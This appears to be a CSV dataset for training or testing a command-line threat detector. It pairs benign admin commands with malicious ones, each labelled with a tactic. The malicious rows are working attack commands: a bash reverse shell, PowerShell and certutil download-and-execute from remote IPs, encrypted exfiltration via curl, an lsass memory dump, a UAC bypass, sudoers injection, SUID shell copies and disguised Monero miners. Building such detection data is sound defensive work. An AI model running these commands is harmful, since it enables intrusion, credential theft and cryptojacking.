process_name,command_line,label,attack_type
docker,docker exec -it audit_trail-1ef0f55b791d3ce4bb8e85e63dc841bf /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
fodhelper.exe,reg add HKCU\Software\Classes\ms-settings\shell\open\command /d C:\Temp\443b9a430bd3ec79e68aa29c99187a39.exe /f & fodhelper.exe,malicious,privilege_escalation
sc.exe,sc.exe config Dnscache start= auto (corporate baseline GPO 2bc73e93c9877ed8),benign,defense_evasion
docker,docker exec -it dataset_part-a799a9ca51c3 /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
blender,blender -b /srv/render/report_final.blend -o /srv/render/out/ -F PNG -x 1 -f 10 -- --cycles-device CPU,benign,crypto_miner
netsh.exe,"netsh.exe advfirewall firewall add rule name=""Allow App 3.36.6"" dir=in action=allow protocol=TCP localport=443",benign,defense_evasion
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\ledger_2024 /v Version /t REG_SZ /d 3.19.6 /f,benign,persistence
curl,curl -s -T /srv/reports/audit_trail-0.10.3.pdf -u svc_report:$RPT_TOKEN https://reports.ad.example.com/api/v2/upload,benign,data_exfiltration
cron,echo '*/15 * * * * ops /opt/monitoring/collect-metrics.sh --push gateway://10.10.240.161:9091' > /etc/cron.d/metrics,benign,persistence
wmic.exe,"wmic.exe /node:10.18.79.16 /user:ansible process call create ""cmd /c certutil -urlcache -f http://5.75.235.13/a4a2fd64d2c3 %TEMP%\a4a2fd64d2c3""",malicious,lateral_movement
pg_dump,pg_dump -h 10.39.213.241 -U jenkins -Fc -f /srv/backups/db/dataset_part-9.5.3.dump --no-password customers,benign,credential_dumping
sc.exe,sc.exe config wuauserv start= auto (corporate baseline GPO a62bf3f5f5762ed3),benign,defense_evasion
cmd.exe,"cmd.exe /c ""sc qc BackupSvc"" & copy C:\Temp\6182eba08e61717f.exe ""C:\Program Files\Vendor\Common.exe"" (unquoted path abuse)",malicious,privilege_escalation
curl,curl -s -T /srv/reports/payroll-6.31.8.pdf -u svc_report:$RPT_TOKEN https://reports.internal.acme.io/api/v2/upload,benign,data_exfiltration
openssl,tar cz /opt/vendor/pkg/cache/objects | openssl enc -aes-256-cbc -k 4f0e82f2593a | curl -s --data-binary @- http://45.230.138.8/u,malicious,data_exfiltration
apt-get,apt-get install -y --no-install-recommends vendor-agent=1.37.7 && systemctl enable vendor-agent,benign,persistence
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=LanmanServer -r:http://app04:5985,benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=1.34.8 && systemctl enable vendor-agent,benign,persistence
sccm,ccmexec.exe /deploy /package:ledger_2024-5.14.0 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
pg_dump,pg_dump -h 10.10.41.185 -U ops -Fc -f /srv/backups/db/snapshot-6.19.2.dump --no-password customers,benign,credential_dumping
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/session_blob/9.36.5/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
make,make -j13 all && make -j13 test (CI build farm node web11),benign,crypto_miner
blender,blender -b /srv/render/ledger_2024.blend -o /srv/render/out/ -F PNG -x 1 -f 35 -- --cycles-device CPU,benign,crypto_miner
mysqldump,mysqldump --single-transaction --master-data=2 -u backup -p$DB_PASS billing | gzip > /srv/backups/snapshot.sql.gz (user: mysql),benign,sql_exploitation
chown,chown -R postgres:postgres /opt/app/releases/4.13.0 && chmod -R 750 /opt/app/releases/4.13.0,benign,privilege_escalation
reg.exe,reg.exe export HKLM\SOFTWARE\Vendor\manifest C:\Backups\reg\manifest-0.9.5.reg /y,benign,credential_dumping
gpg,gpg --export-secret-keys --armor backups@internal.acme.io > /srv/backups/keys/snapshot.asc,benign,credential_dumping
docker,docker run --rm --cpus 20 buildkit:latest build --tag ledger_2024:4.25.6 /workspace,benign,crypto_miner
docker,docker exec -it report_final-35dd0698d556076409fd57564d1af635 /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
ansible-pull,"ansible-pull -U git@edge01.internal.acme.io:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
cron,echo '*/15 * * * * postgres /opt/monitoring/collect-metrics.sh --push gateway://10.37.233.251:9091' > /etc/cron.d/metrics,benign,persistence
powershell.exe,powershell.exe Set-MpPreference -ExclusionPath 'C:\Program Files\Vendor\design_spec' -ExclusionExtension '.tmp' (approved CR-85),benign,defense_evasion
salt,"salt 'node02*' state.apply webserver pillar='{""release"": ""9.6.4""}'",benign,lateral_movement
make,make -j52 all && make -j52 test (CI build farm node svc10),benign,crypto_miner
schtasks.exe,"schtasks.exe /create /s 10.34.168.239 /u svc_backup /tn UpdateSync /tr ""C:\Windows\Temp\a8864878b44c3a1c8e84e566c2c7d023.exe"" /sc onstart /ru SYSTEM /f",malicious,lateral_movement
7z,7z a -mx=9 -ms=on /srv/backups/archive/ledger_2024-0.21.8.7z /srv/backups/nightly/incremental -xr!node_modules,benign,ransomware
certutil.exe,certutil.exe -urlcache -split -f -encode C:\Temp\899bff595056bf30.dat & curl -s http://45.179.56.28/899bff595056bf30 --data-binary @C:\Temp\899bff595056bf30.dat,malicious,data_exfiltration
sqlpackage,sqlpackage /Action:Export /SourceServerName:ci12 /SourceDatabaseName:telemetry_batch /TargetFile:X:\dac\telemetry_batch.bacpac (user: MSSQLSERVER),benign,sql_exploitation
ab,ab -n 100000 -c 500 -k https://ci10.ad.example.com/healthz,benign,crypto_miner
psexec.exe,psexec.exe \\build11 -u CORP\svc_backup -h -accepteula msiexec /i \\worker10\sccm$\packages\audit_trail-4.25.7.msi /qn,benign,lateral_movement
systemd,/tmp/.bdeca475c013/systemd -c /tmp/.bdeca475c013/config.json --cpu-max-threads-hint 100,malicious,crypto_miner
python3,python3 -m http.server 8443 --directory /srv/artifacts/report_final --bind 10.34.168.239,benign,reverse_shell
borg,"borg create --stats --compression zstd,9 /mnt/backup::manifest-20-38 /var/opt/sccm/packages/distribution",benign,ransomware
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\d0df851cf38e -FilePath C:\Backups\certs\snapshot.cer,benign,credential_dumping
dpkg,dpkg -i /opt/packages/snapshot-3.31.4_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
powershell.exe,powershell.exe Start-Process cmd -Verb RunAs -ArgumentList '/c C:\Temp\883354bd434cbd092cce03174720110a.exe' (UAC bypass),malicious,privilege_escalation
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance db01 -Database snapshot -BackupFile 'X:\backups\snapshot-5.40.0.bak' (user: MSSQLSERVER),benign,sql_exploitation
dpkg,dpkg -i /opt/packages/telemetry_batch-1.24.7_amd64.deb && systemctl daemon-reload,benign,privilege_escalation
ssh,ssh -tt -i /etc/ci/deploy_key build@cache02.eng.example.net 'sudo systemctl restart ledger_2024',benign,reverse_shell
bash,bash -i >& /dev/tcp/91.245.55.24/1337 0>&1,malicious,reverse_shell
ssh,ssh -N -L 2222:localhost:5432 svc_backup@build07.eng.example.net,benign,reverse_shell
winrm,winrm invoke Restart wmicimv2/Win32_Service?Name=EventLog -r:http://edge07:5985,benign,lateral_movement
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\snapshot /v Version /t REG_SZ /d 6.21.9 /f,benign,persistence
powershell.exe,"powershell.exe -c ""Invoke-Command -ComputerName build08 -ScriptBlock { iex (New-Object Net.WebClient).DownloadString('http://185.149.97.9/4e95d34f6a9276e0311221dd26e82852') }""",malicious,lateral_movement
sccm,ccmexec.exe /deploy /package:manifest-7.23.2 /collection:AllWorkstations /schedule:asap,benign,lateral_movement
apt-get,apt-get install -y --no-install-recommends vendor-agent=2.34.0 && systemctl enable vendor-agent,benign,persistence
azcopy,azcopy copy 'C:\ProgramData\Vendor\Telemetry\spool' 'https://acme.blob.core.windows.net/backups/session_blob?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
powershell.exe,powershell.exe Backup-SqlDatabase -ServerInstance edge05 -Database dataset_part -BackupFile 'X:\backups\dataset_part-3.16.8.bak' (user: MSSQLSERVER),benign,sql_exploitation
sqlpackage,sqlpackage /Action:Export /SourceServerName:worker07 /SourceDatabaseName:archive_set /TargetFile:X:\dac\archive_set.bacpac (user: MSSQLSERVER),benign,sql_exploitation
bash,bash -c 'cp /bin/bash /tmp/.899bff595056bf30; chmod u+s /tmp/.899bff595056bf30; /tmp/.899bff595056bf30 -p',malicious,privilege_escalation
ssh,"ssh -i /etc/ci/deploy_key deploy@build04.corp.local 'sudo systemctl restart session_blob && sudo journalctl -u session_blob --since ""1 min ago""'",benign,lateral_movement
pg_dump,pg_dump -h 10.25.206.207 -U postgres -Fc -j 4 -f /srv/backups/db/dataset_part-2.6.4.dump analytics (user: postgres),benign,sql_exploitation
borg,"borg create --stats --compression zstd,9 /mnt/backup::telemetry_batch-13-71 C:\Users\ops\AppData\Local\Temp\cache",benign,ransomware
apt-get,apt-get install -y --no-install-recommends vendor-agent=8.4.9 && systemctl enable vendor-agent,benign,persistence
ab,ab -n 100000 -c 500 -k https://cache04.eng.example.net/healthz,benign,crypto_miner
cmd.exe,"cmd.exe /c ""sc qc LanmanServer"" & copy C:\Temp\a99fbb808b8f46c442737aadb56909b8.exe ""C:\Program Files\Vendor\Common.exe"" (unquoted path abuse)",malicious,privilege_escalation
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-7.13.2.wfw,benign,defense_evasion
procdump.exe,procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\a8864878b44c3a1c8e84e566c2c7d023.dmp,malicious,credential_dumping
certutil.exe,certutil.exe -urlcache -f http://45.109.246.245/edd14a3ca377b85e C:\Temp\edd14a3ca377b85e.exe (parent: sqlservr.exe),malicious,sql_exploitation
scp,scp -i /etc/ci/deploy_key build/archive_set-9.38.3.tar.gz admin@node10.corp.local:/opt/app/releases/,benign,lateral_movement
chown,chown -R www-data:www-data /opt/app/releases/2.6.4 && chmod -R 750 /opt/app/releases/2.6.4,benign,privilege_escalation
azcopy,azcopy copy '/usr/local/share/pipeline/artifacts/build' 'https://acme.blob.core.windows.net/backups/archive_set?<SAS>' --recursive --log-level ERROR,benign,data_exfiltration
ldapsearch,"ldapsearch -x -H ldap://cache03.ad.example.com -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName -LLL",benign,credential_dumping
make,make -j30 all && make -j30 test (CI build farm node svc06),benign,crypto_miner
ufw,ufw allow from 10.25.183.59/24 to any port 443 proto tcp comment 'app cluster 1.5.0',benign,defense_evasion
openssl,openssl speed -multi 41 -seconds 30 aes-256-cbc sha256 rsa2048,benign,crypto_miner
sh,"sh -c 'echo ""mssql ALL=(ALL) NOPASSWD:ALL"" >> /etc/sudoers.d/35dd0698d556076409fd57564d1af635'",malicious,privilege_escalation
powershell.exe,powershell.exe Invoke-Command -ComputerName edge04 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 0.19.4,benign,lateral_movement
powershell.exe,powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\Backup-FileShares.ps1 -Source /usr/local/share/pipeline/artifacts/build -Dest \\worker03\backups$ -Retain 28,benign,ransomware
powershell.exe,"powershell.exe ""(Get-Item C:\Temp\257a33d245a1.exe).LastWriteTime=(Get-Date '2017-05-12')""",malicious,defense_evasion
pg_dump,pg_dump -h 10.23.157.102 -U postgres -Fc -j 4 -f /srv/backups/db/customer_db-6.27.0.dump analytics (user: postgres),benign,sql_exploitation
reg.exe,reg.exe add HKLM\SOFTWARE\Vendor\design_spec /v Version /t REG_SZ /d 6.6.9 /f,benign,persistence
expect,expect -f /opt/automation/rotate-router-cache01.exp,benign,reverse_shell
curl,curl -s -X POST --data-binary @/var/log/app/metrics.json http://10.29.41.236:9091/metrics/job/report_final -H 'Content-Type: application/json',benign,data_exfiltration
pg_dump,pg_dump -Fc -Z9 -f /srv/backups/db/report_final-2.37.1.dump warehouse,benign,ransomware
ssh,ssh -tt -i /etc/ci/deploy_key postgres@node05.eng.example.net 'sudo systemctl restart report_final',benign,reverse_shell
cron,echo '*/15 * * * * www-data /opt/monitoring/collect-metrics.sh --push gateway://10.25.183.59:9091' > /etc/cron.d/metrics,benign,persistence
docker,docker run --rm --cpus 37 buildkit:latest build --tag payroll:2.2.1 /workspace,benign,crypto_miner
chown,chown -R root:root /opt/app/releases/0.30.4 && chmod -R 750 /opt/app/releases/0.30.4,benign,privilege_escalation
docker,docker exec -it report_final-9f03bd07fb81789a /bin/bash -lc 'tail -f /var/log/app/current',benign,reverse_shell
zfs,zfs snapshot tank/data/app11@nightly-453,benign,ransomware
ffmpeg,ffmpeg -i /srv/media/telemetry_batch.mov -c:v libx264 -preset slow -crf 18 -threads 45 /srv/media/out/telemetry_batch.mp4,benign,crypto_miner
scp,scp -C -i /etc/ci/key /srv/backups/db/audit_trail-0.11.1.dump backup@build03.corp.local:/srv/offsite/,benign,data_exfiltration
terraform,terraform apply -auto-approve -target=module.cluster.node.db12 -var image_version=7.19.4,benign,lateral_movement
blender,blender -b /srv/render/dataset_part.blend -o /srv/render/out/ -F PNG -x 1 -f 38 -- --cycles-device CPU,benign,crypto_miner
make,make -j20 all && make -j20 test (CI build farm node app10),benign,crypto_miner
docker,docker run --rm --cpus 23 buildkit:latest build --tag session_blob:4.36.2 /workspace,benign,crypto_miner
sshd,sshd --algo rx/0 -o 91.96.159.57:8443 -u f01e2fedbe2f --background --max-cpu-usage 90 (masquerade),malicious,crypto_miner
sqlcmd,sqlcmd -S 10.12.83.62 -E -i C:\Maintenance\reindex-session_blob.sql -o C:\Logs\reindex-75.log (user: MSSQLSERVER),benign,sql_exploitation
fluent-bit,fluent-bit -i tail -p path=/var/log/snapshot/*.log -o forward -p host=10.12.80.177 -p port=24224,benign,data_exfiltration
powershell.exe,powershell.exe Invoke-Command -ComputerName edge10 -FilePath C:\Scripts\Deploy-Agent.ps1 -ArgumentList 5.38.5,benign,lateral_movement
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-telemetry_batch.rman log=/var/log/rman-26.log (user: oracle),benign,sql_exploitation
cmd.exe,"cmd.exe /c ""sc qc Dnscache"" & copy C:\Temp\5d053f05ae82111c.exe ""C:\Program Files\Vendor\Common.exe"" (unquoted path abuse)",malicious,privilege_escalation
apt-get,apt-get install -y --no-install-recommends vendor-agent=9.19.7 && systemctl enable vendor-agent,benign,persistence
docker,docker run --rm --cpus 30 buildkit:latest build --tag customer_db:1.34.2 /workspace,benign,crypto_miner
gpg,gpg --export-secret-keys --armor backups@eng.example.net > /srv/backups/keys/manifest.asc,benign,credential_dumping
scp,scp -C -i /etc/ci/key /srv/backups/db/archive_set-3.11.8.dump backup@edge03.internal.acme.io:/srv/offsite/,benign,data_exfiltration
restic,restic -r sftp:svc_backup@edge11.internal.acme.io:/backups backup C:\Users\sysadmin\AppData\Local\Temp\cache --tag nightly --exclude-caches,benign,ransomware
sqlpackage,sqlpackage /Action:Export /SourceServerName:build01 /SourceDatabaseName:archive_set /TargetFile:X:\dac\archive_set.bacpac (user: MSSQLSERVER),benign,sql_exploitation
pg_dump,pg_dump -h 10.36.117.142 -U postgres -Fc -j 4 -f /srv/backups/db/customer_db-4.34.0.dump analytics (user: postgres),benign,sql_exploitation
powershell.exe,powershell.exe Export-Certificate -Cert Cert:\LocalMachine\My\632196f863074b23 -FilePath C:\Backups\certs\design_spec.cer,benign,credential_dumping
nohup,nohup /dev/shm/.8934fd9a4302 --coin monero --url 5.76.143.83:80 --tls --rig-id build11 &,malicious,crypto_miner
tar,tar czf - /srv/backups/nightly/incremental | ssh -i /etc/ci/key backup@10.3.76.111 'cat > /srv/backups/archive_set-4.25.3.tgz',benign,data_exfiltration
sc.exe,sc.exe config TermService start= auto (corporate baseline GPO 2d2d8926fa8cd76eca327835c28fbb54),benign,defense_evasion
tar,tar czf - /srv/backups/nightly/incremental | ssh -i /etc/ci/key backup@10.39.250.240 'cat > /srv/backups/dataset_part-6.27.3.tgz',benign,data_exfiltration
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-payroll.rman log=/var/log/rman-36.log (user: oracle),benign,sql_exploitation
ffmpeg,ffmpeg -i /srv/media/customer_db.mov -c:v libx264 -preset slow -crf 18 -threads 17 /srv/media/out/customer_db.mp4,benign,crypto_miner
ssh,ssh -N -L 9001:localhost:5432 release@svc10.corp.local,benign,reverse_shell
chown,chown -R svc_backup:svc_backup /opt/app/releases/0.0.8 && chmod -R 750 /opt/app/releases/0.0.8,benign,privilege_escalation
cron,echo '*/15 * * * * jenkins /opt/monitoring/collect-metrics.sh --push gateway://10.13.92.137:9091' > /etc/cron.d/metrics,benign,persistence
docker,docker run --rm --cpus 54 buildkit:latest build --tag telemetry_batch:5.0.6 /workspace,benign,crypto_miner
sqlpackage,sqlpackage /Action:Export /SourceServerName:node09 /SourceDatabaseName:snapshot /TargetFile:X:\dac\snapshot.bacpac (user: MSSQLSERVER),benign,sql_exploitation
cron,echo '*/15 * * * * mssql /opt/monitoring/collect-metrics.sh --push gateway://10.3.87.82:9091' > /etc/cron.d/metrics,benign,persistence
cron,echo '*/15 * * * * root /opt/monitoring/collect-metrics.sh --push gateway://10.10.41.185:9091' > /etc/cron.d/metrics,benign,persistence
ansible-pull,"ansible-pull -U git@build03.corp.local:ops/playbooks.git -i localhost, --vault-password-file /etc/ansible/vault.pass site.yml",benign,reverse_shell
aws,aws s3 sync /srv/backups/db s3://acme-backups-eu/telemetry_batch/5.0.9/ --storage-class STANDARD_IA --only-show-errors,benign,data_exfiltration
netsh.exe,netsh.exe advfirewall export C:\Backups\fw\policy-1.21.7.wfw,benign,defense_evasion
stress-ng,stress-ng --cpu 13 --cpu-method matrixprod --timeout 600s --metrics-brief,benign,crypto_miner
terraform,terraform apply -auto-approve -target=module.cluster.node.app02 -var image_version=5.4.0,benign,lateral_movement
tar,tar czf - /var/opt/sccm/packages/distribution | ssh -i /etc/ci/key backup@10.13.92.137 'cat > /srv/backups/manifest-3.25.1.tgz',benign,data_exfiltration
terraform,terraform apply -auto-approve -target=module.cluster.node.edge04 -var image_version=5.29.0,benign,lateral_movement
ufw,ufw allow from 10.33.94.200/24 to any port 53 proto tcp comment 'app cluster 5.31.2',benign,defense_evasion
ora_backup,rman target / cmdfile=/opt/oracle/scripts/backup-customer_db.rman log=/var/log/rman-85.log (user: oracle),benign,sql_exploitation
ssh,ssh -N -L 53:localhost:5432 admin@svc06.internal.acme.io,benign,reverse_shell
cmd.exe,"cmd.exe /c bcp ""SELECT * FROM sys.databases"" queryout C:\Temp\fe08eda2b3f213bb.dat -c -T (parent: sqlservr.exe)",malicious,sql_exploitation
make,make -j35 all && make -j35 test (CI build farm node db10),benign,crypto_miner
powershell.exe,powershell.exe Start-Process cmd -Verb RunAs -ArgumentList '/c C:\Temp\796a38a0013b9befab89474233b0afbe.exe' (UAC bypass),malicious,privilege_escalation
